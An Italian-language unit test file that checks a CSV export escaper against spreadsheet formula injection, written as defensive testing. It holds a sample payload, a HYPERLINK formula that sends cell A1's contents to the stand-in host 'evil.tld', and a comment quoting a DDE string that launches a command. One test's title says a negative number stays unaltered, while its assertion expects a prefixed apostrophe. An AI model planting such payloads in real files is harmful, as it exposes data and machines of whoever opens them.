// Escaping degli export CSV del pannello Admin.
//
// Regressione S-06/S-11: l'escaping RFC 4180 era corretto ma proteggeva solo
// la struttura del file, non il foglio di calcolo che lo apre. Una cella che
// inizia con =, +, - o @ viene valutata come formula da Excel e LibreOffice,
// e il contenuto esportato (titoli di task, nomi cliente) è testo scritto da
// terzi.
import { describe, it, expect } from "vitest";
import { escapeCSV } from "../../components/admin/adminExport.js";

describe("escapeCSV — struttura del CSV", () => {
  it("lascia intatto un valore semplice", () => {
    expect(escapeCSV("Prenotazione Roma")).toBe("Prenotazione Roma");
  });

  it("quota i valori che contengono virgole, apici o a capo", () => {
    expect(escapeCSV("Rossi, Mario")).toBe('"Rossi, Mario"');
    expect(escapeCSV('Hotel "Belvedere"')).toBe('"Hotel ""Belvedere"""');
    expect(escapeCSV("riga1\nriga2")).toBe('"riga1\nriga2"');
  });

  it("rende stringa vuota null e undefined invece di 'null'/'undefined'", () => {
    expect(escapeCSV(null)).toBe("");
    expect(escapeCSV(undefined)).toBe("");
  });
});

describe("escapeCSV — neutralizzazione delle formule", () => {
  it("neutralizza una formula che esfiltra dati verso un dominio esterno", () => {
    const attacco = '=HYPERLINK("https://evil.tld?d="&A1,"Apri")';
    const out = escapeCSV(attacco);
    // L'apice iniziale forza l'interpretazione testuale; la virgola dentro il
    // valore fa comunque scattare la quotatura RFC 4180.
    expect(out.startsWith("\"'=")).toBe(true);
    expect(out).toContain("HYPERLINK");
  });

  it("neutralizza tutti i caratteri che avviano una formula", () => {
    for (const c of ["=", "+", "-", "@", "\t", "\r"]) {
      expect(escapeCSV(`${c}CMD`).replace(/^"/, "").startsWith("'")).toBe(true);
    }
  });

  it("non altera un valore che contiene = ma non ci inizia", () => {
    // Un titolo legittimo non deve guadagnare un apice: l'export resta
    // leggibile e re-importabile.
    expect(escapeCSV("Saldo = 100")).toBe("Saldo = 100");
  });

  it("non altera un numero negativo passato come numero", () => {
    // Il trigger si applica alla rappresentazione testuale: -50 come numero
    // diventa "-50", che inizia con '-'. È il compromesso accettato — una cella
    // numerica negativa esportata resta leggibile come testo, mentre lasciarla
    // passare significherebbe lasciar passare anche "-2+3+cmd|' /C calc'!A0".
    expect(escapeCSV(-50)).toBe("'-50");
  });
});
